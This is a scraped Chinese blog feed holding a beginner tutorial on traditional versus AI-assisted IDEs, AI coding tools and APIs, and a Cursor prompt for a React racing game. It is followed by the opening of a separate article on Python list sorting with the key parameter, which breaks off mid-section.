.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">学习目标</h2>
<p>之前在 z.ai 上体验 AI 编程时，你是不是也发现了网页版的诸多不便？比如没法随时保存工作成果、文件管理杂乱无章，甚至连稍复杂的项目都难以推进。别担心，这一章就来解决这些问题 —— 我们会在本地独立完成完整的编程项目，彻底摆脱网页版的限制。</p>
<ul>
<li>IDE和AI IDE有什么区别？</li>
<li>如何使用AI IDE</li>
</ul>
<h2 data-id="heading-1">写代码需要什么准备？</h2>
<p>代码就是一堆文字，通过编译器处理后，之后变为可执行文件。虽说用系统自带的记事本也能写代码，但实际用起来全是坑：</p>
<ul>
<li>所有代码都是黑字，关键字、文字、注释混在一起，根本看不清代码结构</li>
<li>没有任何智能提示，每个代码单词都得手动完整敲出来，拼错一个字母就得反复核对</li>
<li>文件多了就乱成一团，十几个文件来回切换，经常找不到要修改的那一行・程序出错只能瞎猜，崩了都不知道问题在哪，只能一行行打印日志排查</li>
</ul>
<p>这就是为啥你需要 IDE（集成开发环境）。它会给代码上色、输入时自动提示、按项目整理文件，还能精准定位错误，让你写代码效率更高、出错更少。</p>
<h3 data-id="heading-2"><code>IDE</code> VS <code>AI IDE</code></h3>
<p>在AI时代，AI IDE不再是传统IDE的简单功能叠加，而是以生成式AI重构开发工作流——传统IDE聚焦“辅助手动编码”，AI IDE则化身“智能协作伙伴”，将开发者从重复、低价值的工作中解放，核心聚焦需求定义与逻辑把控，大幅提升开发效率。</p>
<h4 data-id="heading-3">核心差异对比表</h4>



































<table><thead><tr><th>对比维度</th><th>传统IDE（如VS Code、IntelliJ IDEA（当然现在这些IDE都已支持AI功能））</th><th>AI IDE（如Cursor、GitHub Copilot X）</th></tr></thead><tbody><tr><td>核心定位</td><td>标准化编码工具集</td><td>智能协作开发伙伴</td></tr><tr><td>核心能力</td><td>语法高亮、基础补全、调试编译</td><td>代码生成、实时解释、智能调试优化</td></tr><tr><td>资料查阅方式</td><td>需手动切换环境查文档/搜资料</td><td>选中代码即可AI实时解释，无需跳出环境</td></tr><tr><td>效率提升方向</td><td>优化手动编码流程</td><td>替代重复编码、降低理解/调试成本</td></tr><tr><td>开发者角色</td><td>代码的直接生产者</td><td>需求定义者+逻辑把控者</td></tr></tbody></table>
<ol>
<li>传统IDE仅辅助手动编码，需开发者完成全流程操作；</li>
<li>AI IDE核心优势是AI驱动的代码生成、实时解释，大幅节省查资料/写重复代码的时间；</li>
<li>两者核心差异在于：AI IDE将开发者从低价值工作中解放，聚焦核心逻辑与创新。</li>
</ol>
<h3 data-id="heading-4">IDE的发展</h3>
<h4 data-id="heading-5">先搞懂：IDE到底是个啥？</h4>
<p>IDE（集成开发环境）说白了就是程序员的“一站式工作台”。你可以把它想象成：</p>
<ul>
<li>普通记事本（纯文本编辑器） + 各种实用工具（比如代码检查、运行按钮、调试器） + 专属工作间（适配不同编程语言的环境）</li>
<li>核心机制就是<strong>编辑器（写代码的地方）+ 插件（扩展功能的“小工具”）+ 环境（让代码能跑起来的“地基”）</strong> ，三者打包在一起，不用你东拼西凑。</li>
</ul>
<h4 data-id="heading-6">IDE的发展：从“纯手动”到“全自动”</h4>
<p>IDE不是一下子就这么好用的，它是跟着程序员的需求一步步进化的，核心就是从“终端纯命令”走向“图形化界面”：</p>
<h5 data-id="heading-7">早期：没有IDE，全靠“终端+纯编辑器”硬扛</h5>
<p>最早程序员写代码，连个可视化界面都没有，全在黑乎乎的“终端/命令行”里操作：</p>
<ul>
<li>用最基础的文本编辑器（比如Unix系统里的vi，后来升级成vim）写代码：没有语法高亮、没有自动补全，代码全靠手敲，写错了也不会提醒；</li>
<li>写完代码要自己敲命令编译、运行：比如敲<code>gcc 文件名.c</code>编译C语言代码，敲<code>python 文件名.py</code>运行Python代码；</li>
<li>这个阶段没有“插件”和“集成环境”的概念：编辑器只负责“写文字”，要啥功能都得自己用命令实现，比如想格式化代码，得单独装工具、敲命令，对新手特别不友好。</li>
</ul>
<h5 data-id="heading-8">过渡：图形化编辑器出现，开始“加插件”</h5>
<p>随着电脑图形界面普及，出现了带窗口、能点鼠标的编辑器（比如Notepad++、Sublime Text）：</p>
<ul>
<li>核心还是“编辑器”，但有了可视化界面：能看到代码的语法高亮（不同代码标不同颜色）、能点按钮保存/打开文件，不用记一堆命令；</li>
<li>开始支持“插件”：比如装个插件就能自动补全代码、装个插件就能检查语法错误、装个插件就能直接运行代码，相当于给基础编辑器“加外挂”；</li>
<li>但还不算完整的IDE：环境需要自己配（比如要手动装Python、Java的运行环境，还要告诉编辑器“环境在哪”），调试代码还是得靠命令，只是比纯终端方便一点。</li>
</ul>
<h5 data-id="heading-9">现在：成熟的IDE，“编辑器+插件+环境”全集成</h5>
<p>现在的主流IDE（比如VS Code、PyCharm、Eclipse）把“编辑器、插件、环境”打包得明明白白：</p>
<ul>
<li>编辑器：自带智能提示、语法高亮、代码格式化，甚至能实时提醒你哪里写错了；</li>
<li>插件：内置常用插件，也能自己装（比如Python插件、前端插件、翻译插件），点几下就能装，不用记命令；</li>
<li>环境：能自动识别或帮你配置运行环境（比如PyCharm新建项目时，能直接帮你装Python虚拟环境；VS Code能一键配置Node.js环境），写完代码点个“运行”按钮就能跑，调试代码时能直观看到每一步的变量值，不用再敲复杂的调试命令。</li>
</ul>
<h3 data-id="heading-10">核心机制拆解</h3>
<p>再回头看IDE的核心机制，就很好理解了：</p>

























<table><thead><tr><th>组成部分</th><th>通俗解释</th><th>举个例子</th></tr></thead><tbody><tr><td>编辑器</td><td>写代码的“本子”</td><td>就像带颜色标注的笔记本，能自动提醒你写字错了</td></tr><tr><td>插件</td><td>本子的“便利贴/小工具”</td><td>比如贴个“自动补全”便利贴，写代码时不用记全单词；贴个“运行”小工具，点一下就能看结果</td></tr><tr><td>环境</td><td>写代码的“书桌+工具台”</td><td>比如写Python代码需要的Python解释器、写Java需要的JDK，IDE帮你摆好，不用自己找地方放</td></tr></tbody></table>
<p>总结</p>
<ol>
<li>IDE的核心是“编辑器（写代码）+ 插件（扩功能）+ 环境（跑代码）”，本质是把程序员的工作流程打包简化；</li>
<li>发展历程是从“终端+vim纯手动操作”，到“图形化编辑器加插件”，再到“全集成的可视化IDE”；</li>
<li>进化的核心目的：让程序员不用花精力在“配环境、记命令”上，专心写代码就行。</li>
</ol>
<h3 data-id="heading-11">目前常见IDE</h3>
<p>现在主流的编程IDE都内置了AI功能，不用额外折腾就能直接用AI帮你写代码、改bug、解释代码，大大提升写代码的效率。不同IDE的AI侧重不同，有的轻量通用，有的专门做AI编程，你可以按需选：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2F" target="_blank" title="https://code.visualstudio.com/" ref="nofollow noopener noreferrer">VS Code</a>：最常用的轻量级IDE，本身免费且支持所有主流编程语言，装个AI插件（比如GitHub Copilot）就能用AI辅助编程，新手入门首选；</li>
<li><a href="https://www.trae.ai/" target="_blank" title="https://www.trae.ai/" ref="nofollow noopener noreferrer">Trae</a>：主打AI驱动的编程工具，界面简洁，AI代码生成、调试、重构的功能做得比较聚焦，不用复杂配置；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2F" target="_blank" title="https://cursor.com/" ref="nofollow noopener noreferrer">Cursor</a>：专为AI编程设计的IDE，内置GPT-4等大模型，支持直接用自然语言写代码、改代码，甚至能实时对话式编程，对新手特别友好；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.qoder.com%2F" target="_blank" title="https://www.qoder.com/" ref="nofollow noopener noreferrer">Qoder</a>：轻量的AI编程工具，侧重快速写代码、实时纠错，适合快速写小脚本或调试代码片段；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.codebuddy.com%2F" target="_blank" title="https://www.codebuddy.com/" ref="nofollow noopener noreferrer">CodeBuddy</a>：AI代码助手类IDE，除了写代码，还能帮你解释代码逻辑、生成测试用例，适合学习编程时用；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2F" target="_blank" title="https://code.visualstudio.com/" ref="nofollow noopener noreferrer">VS Code</a> + <a href="https://link.juejin.cn?target=https%3A%2F%2Fcline.bot%2F" target="_blank" title="https://cline.bot/" ref="nofollow noopener noreferrer">Cline</a>：在经典的VS Code里加装Cline插件，相当于给VS Code升级更强的AI功能，兼顾VS Code的通用性和Cline的AI能力。</li>
</ul>
<h3 data-id="heading-12">自己配置API</h3>
<p>如果觉得IDE自带的AI功能不够用（比如限制次数、效果一般），可以自己对接免费/低成本的AI开放平台API，相当于给IDE换“更强大的AI大脑”，这些平台都是国内/主流的，使用门槛低：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.volcengine.com%2Factivity%2Fcodingplan" target="_blank" title="https://www.volcengine.com/activity/codingplan" ref="nofollow noopener noreferrer">方舟Coding-Plan</a>：火山引擎的AI编程平台，有免费的API额度，适配中文编程场景，配置简单，适合新手尝试；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fbigmodel.cn%2Fglm-coding" target="_blank" title="https://bigmodel.cn/glm-coding" ref="nofollow noopener noreferrer">智谱AI开放平台</a>：主打中文大模型，AI写代码、解释代码的效果贴合国内开发者习惯，能申请免费试用额度；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.deepseek.com%2F" target="_blank" title="https://platform.deepseek.com/" ref="nofollow noopener noreferrer">DeepSeek 开放平台</a>：专门做代码大模型的平台，代码生成、调试的精准度高，有免费额度，适合对代码质量要求高的场景。</li>
</ul>
<h3 data-id="heading-13">AI agent代理</h3>
<p>如果想让AI不只是“写代码”，还能“帮你完整解决编程问题”（比如自动分析需求、写完整项目、调试全流程），就可以用AI Agent工具。你只需要自己买少量API额度，把API导入这些工具，就能用ClaudeCode这类强大的Agent功能，相当于雇了个“AI程序员助理”：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai" target="_blank" title="https://opencode.ai" ref="nofollow noopener noreferrer">OpenCode</a>：开源的AI Agent工具，支持对接多种API，能自定义AI的编程逻辑，适合想折腾、定制化需求的用户；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fclaude.ai%2F" target="_blank" title="https://claude.ai/" ref="nofollow noopener noreferrer">ClaudeCode</a>：Anthropic旗下的AI Agent，擅长处理复杂的编程任务（比如写完整项目、排查复杂bug），需要先购买API密钥再导入使用，功能强但有一定使用成本。</li>
</ul>
<hr/>
<h4 data-id="heading-14">总结</h4>
<ol>
<li>常见AI IDE分两类：通用型（如VS Code）需装插件，专用型（如Cursor）开箱即用，新手优先选Cursor或VS Code；</li>
<li>自己配置API能替换IDE的AI引擎，推荐先试国内平台（方舟、智谱）的免费额度；</li>
<li>AI Agent是更进阶的用法，能实现“全流程AI编程”，适合处理复杂编程任务，需自行购买API后使用。</li>
</ol>
<h2 data-id="heading-15">在本地用React写个赛车游戏</h2>
<p>选择合适的IDE和AI工具后（我这里使用cursor），在本地开发一个赛车游戏！</p>
<p>step1：搭建AI skills框架和项目软件架构</p>
<pre><code class="hljs language-arduino" lang="arduino">我想用前端框架开发一个赛车游戏，给我一个软件架构方案，还有cursor中的rules和skills方案
</code></pre>
<p>step2：不断实现小功能，优化</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### 完整开发提示词（车辆竞速类游戏/仿真系统）</span>
基于游戏引擎（如Unity/Unreal）或原生编程语言（如C++/Python/TypeScript），开发一套轻量级车辆竞速核心系统，需覆盖以下模块的完整设计与实现，要求功能闭环、逻辑自洽，兼顾物理真实性与交互体验：

<span class="hljs-section">#### 1. 车辆系统（新增多类型车辆定制）</span>
<span class="hljs-strong">**核心目标**</span>：构建可复用、差异化的多类型车辆模型，支持属性定制与多维度控制
<span class="hljs-bullet">-</span> 基础模型：定义通用车辆基类，派生3类核心车辆（可扩展），每类车辆绑定专属标识、外观资源、阵营属性：
<span class="hljs-bullet">  -</span> F1赛车：轻量化竞速车型，核心特征为「超高极速、高加速度、低转向半径、弱碰撞抗性」；
<span class="hljs-bullet">  -</span> 警车：均衡型功能车型，核心特征为「中高极速、中加速度、中等转向灵敏度、中等碰撞抗性，附带警笛触发逻辑」；
<span class="hljs-bullet">  -</span> 救护车：重型功能车型，核心特征为「低极速、低加速度、大转向半径、高碰撞抗性，附带应急优先通行逻辑（如AI车辆主动避让）」；
<span class="hljs-bullet">-</span> 物理属性：为每类车辆定制专属参数表（如下），支持动态调整：
  | 车辆类型 | 重量(kg) | 最大速度(km/h) | 加速度(m/s²) | 转向灵敏度 | 漂移系数 | 碰撞抗性 |
  |----------|----------|----------------|--------------|------------|----------|----------|
  | F1赛车   | 700      | 350            | 15           | 高         | 低       | 弱       |
  | 警车     | 1500     | 220            | 8            | 中         | 中       | 中       |
  | 救护车   | 2000     | 180            | 5            | 低         | 极低     | 高       |
<span class="hljs-bullet">-</span> 控制逻辑：通用控制映射（油门/刹车/转向/漂移）适配所有车型，差异化响应（如F1漂移易触发但难维持，救护车几乎无法漂移）；支持车辆状态监听（怠速/行驶/漂移/碰撞/特殊状态：如救护车应急模式、警车警笛开启）。

<span class="hljs-section">#### 2. 赛道系统（新增3类差异化赛道）</span>
<span class="hljs-strong">**核心目标**</span>：构建3类特征鲜明的赛道模型，支撑不同车辆的竞速体验，支持加载与切换
<span class="hljs-bullet">-</span> 数据结构：通用赛道基类包含「边界、分段、标记点、坐标系」，派生3类专属赛道，每类赛道定制核心参数：
<span class="hljs-bullet">  -</span> 城市街道赛道：
<span class="hljs-code">    特征：多直角弯道、窄车道、路边障碍物（路灯/护栏）、部分路段限速；
    适配车辆：警车（灵活度适配城市路况）；
    特殊规则：包含红绿灯减速区、人行道禁行区。
  - 专业竞速赛道：
    特征：大半径高速弯道、直道占比60%、宽车道、无障碍物；
    适配车辆：F1赛车（最大化极速优势）；
    特殊规则：包含加速带、弯道刹车提示线。
  - 郊区越野赛道：
    特征：凹凸路面、泥泞路段（摩擦系数低）、连续S弯道、宽缓冲区；
    适配车辆：救护车（高碰撞抗性适配复杂路况）；
    特殊规则：泥泞路段车速衰减、缓冲区无碰撞惩罚。
- 加载逻辑：支持静态加载（预设3类赛道数据）、动态切换（运行时更换赛道，保留车辆状态）；输出每类赛道的「可行驶区、碰撞体、专属规则触发区」；
- 辅助功能：赛道起点重置、圈数统计（适配不同赛道长度）、赛道边界可视化（调试模式）。
</span>
<span class="hljs-section">#### 3. 物理系统</span>
<span class="hljs-strong">**核心目标**</span>：实现简化但符合直觉的车辆物理，适配不同车型/赛道的差异化表现
<span class="hljs-bullet">-</span> 基础运动：基于牛顿运动定律，结合车辆重量/赛道摩擦系数计算速度、转向，如F1在专业赛道极速拉满，救护车在越野赛道减速衰减更慢；
<span class="hljs-bullet">-</span> 漂移逻辑：差异化漂移规则（F1仅高速弯道可漂移，救护车禁用漂移），计算漂移角度、减速系数，关联车辆漂移系数与赛道摩擦系数；
<span class="hljs-bullet">-</span> 物理约束：每类车辆绑定专属速度/转向上限，每类赛道定制地面摩擦力（如越野赛道泥泞区摩擦系数0.3，专业赛道0.9）。

<span class="hljs-section">#### 4. 碰撞检测</span>
<span class="hljs-strong">**核心目标**</span>：精准检测车辆与赛道边界/障碍物的碰撞，触发差异化反馈
<span class="hljs-bullet">-</span> 检测逻辑：采用AABB/射线检测，适配不同赛道的边界形状（城市赛道直角边界、专业赛道弧形边界）；
<span class="hljs-bullet">-</span> 碰撞反馈：碰撞力度关联车辆重量（救护车碰撞后速度衰减少，F1碰撞后易失控），赛道障碍物碰撞触发不同惩罚（城市赛道撞护栏减速30%，越野赛道撞缓冲区无惩罚）；
<span class="hljs-bullet">-</span> 边界判定：区分每类赛道的“禁行区”（如城市赛道人行道、专业赛道赛道外区域），触发对应减速规则。

<span class="hljs-section">#### 5. AI 对手系统</span>
<span class="hljs-strong">**核心目标**</span>：实现适配不同车辆/赛道的基础AI竞速能力
<span class="hljs-bullet">-</span> 路径规划：AI基于赛道类型生成专属路径（城市赛道优先避让禁行区，专业赛道优先走直道，越野赛道优先走平整路段）；
<span class="hljs-bullet">-</span> 行为逻辑：AI车辆匹配对应车型特征（AI-F1在专业赛道全程满速，AI-警车在城市赛道自动避让红绿灯，AI-救护车在越野赛道减速通过泥泞区）；
<span class="hljs-bullet">-</span> 难度分级：简单/中等/困难难度下，调整AI的“反应灵敏度+极限操作率”（如困难难度AI-F1可贴弯漂移）；
<span class="hljs-bullet">-</span> 交互规则：AI车辆识别救护车“应急模式”，主动减速/变道避让；AI警车可触发“追缉模式”，优先追击玩家车辆。

<span class="hljs-section">#### 补充要求</span>
<span class="hljs-bullet">-</span> 性能：物理计算与碰撞检测频率可配置（60Hz），多赛道/多车辆切换无帧率下降；
<span class="hljs-bullet">-</span> 扩展性：车辆/赛道模块支持新增类型（如卡车、山地赛道），无需修改核心逻辑；
<span class="hljs-bullet">-</span> 调试：提供车辆参数面板、赛道规则编辑器、AI决策日志打印功能。

---

<span class="hljs-section">### 总结</span>
<span class="hljs-bullet">1.</span> 车辆系统：明确3类核心车型的差异化参数+专属特征，适配不同赛道场景；
<span class="hljs-bullet">2.</span> 赛道系统：定义3类赛道的「物理特征+适配车辆+专属规则」，形成场景闭环；
<span class="hljs-bullet">3.</span> 物理/AI/碰撞模块：同步适配车型/赛道的差异化，保证逻辑一致性；
<span class="hljs-bullet">4.</span> 所有设计兼顾“真实性”与“可玩性”，参数表可直接落地开发。

如果需要补充某类车辆/赛道的细节（如救护车应急模式具体逻辑、城市赛道红绿灯触发规则），或适配特定引擎（如Unity）的开发规范，我可以进一步细化。
</code></pre>
<p>step3：运行
执行<code>npm run dev</code></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c247b2acec624471be6f5cc1b471986c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rS-5pif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771527346&amp;x-signature=uLCaJZd6Joi%2Fin0DMPbaAehULs4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-16">参考</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdatawhalechina%2Feasy-vibe" target="_blank" title="https://github.com/datawhalechina/easy-vibe" ref="nofollow noopener noreferrer">datawhalechina/easy-vibe: Vibe coding from 0 to 1 ｜把想法做成真正能上线的产品｜首个交互式教程｜零基础也能学会的 AI 编程实战</a></p>
<p>部分文字用豆包润色</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python列表排序：用key参数掌控排序规则]]></title>    <link>https://juejin.cn/post/7605848213603287086</link>    <guid>https://juejin.cn/post/7605848213603287086</guid>    <pubDate>2026-02-13T01:15:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213603287086" data-draft-id="7605848213603270702" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python列表排序：用key参数掌控排序规则"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-13T01:15:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="站大爷IP"/> <meta itemprop="url" content="https://juejin.cn/user/2905353241759261"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python列表排序：用key参数掌控排序规则
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2905353241759261/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    站大爷IP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:15:50.000Z" title="Fri Feb 13 2026 01:15:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>免费编程软件「python+pycharm」
链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F48a86be2fdc0" target="_blank" title="https://pan.quark.cn/s/48a86be2fdc0" ref="nofollow noopener noreferrer">pan.quark.cn/s/48a86be2f…</a></strong></p>
<p>在Python编程中，列表排序是高频操作。无论是处理用户输入的数据、分析日志文件，还是实现算法逻辑，排序都能让数据更有序、更易处理。但当列表包含混合类型元素，或需要按特定规则排序时，直接调用<code>sort()</code>或<code>sorted()</code>可能会报错或得不到预期结果。这时，<code>key</code>参数就是解决问题的关键——它能自定义排序规则，让排序逻辑更灵活。</p>
<h2 data-id="heading-0">一、基础排序：默认规则的局限性</h2>
<h3 data-id="heading-1">1.1 默认排序的“陷阱”</h3>
<p>Python的列表排序默认按元素自然顺序排列。对数字列表<code>[3, 1, 4, 2]</code>，<code>list.sort()</code>或<code>sorted()</code>会按数值大小升序排列；对字符串列表<code>['banana', 'apple', 'cherry']</code>，则按字母顺序排列。但若列表包含混合类型，如<code>['oeasy', 123]</code>，直接排序会触发<code>TypeError</code>，因为Python无法比较字符串和整数。</p>
<pre><code class="hljs language-scss" lang="scss">lst = <span class="hljs-selector-attr">[<span class="hljs-string">'oeasy'</span>, 123]</span>
lst<span class="hljs-selector-class">.sort</span>()  # 报错：TypeError: <span class="hljs-string">'&lt;'</span> not supported between instances of <span class="hljs-string">'int'</span> and <span class="hljs-string">'str'</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-2">1.2 强制类型转换的“笨办法”</h3>
<p>为解决混合类型排序问题，可先将所有元素转为同一类型（如字符串），再排序。例如：</p>
<pre><code class="hljs language-scss" lang="scss">lst = <span class="hljs-selector-attr">[<span class="hljs-string">'oeasy'</span>, 123]</span>
lst<span class="hljs-selector-class">.sort</span>(key=str)  # 将所有元素转为字符串后比较
<span class="hljs-built_in">print</span>(lst)  # 输出：<span class="hljs-selector-attr">[<span class="hljs-string">'123'</span>, <span class="hljs-string">'oeasy'</span>]</span>（因为 '<span class="hljs-number">123</span>' &lt; 'oeasy'）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>但这种方法并非万能。若尝试将字符串转为整数（如<code>['999', '123']</code>转为<code>[999, 123]</code>后排序），对无法转换的字符串（如<code>['oeasy', '123']</code>）会报错。因此，强制类型转换仅适用于能安全转换的场景。</p>
<h2 data-id="heading-3">二、key参数：自定义排序的“魔法棒”</h2>
<h3 data-id="heading-4">2.1 key参数的作用原理</h3>
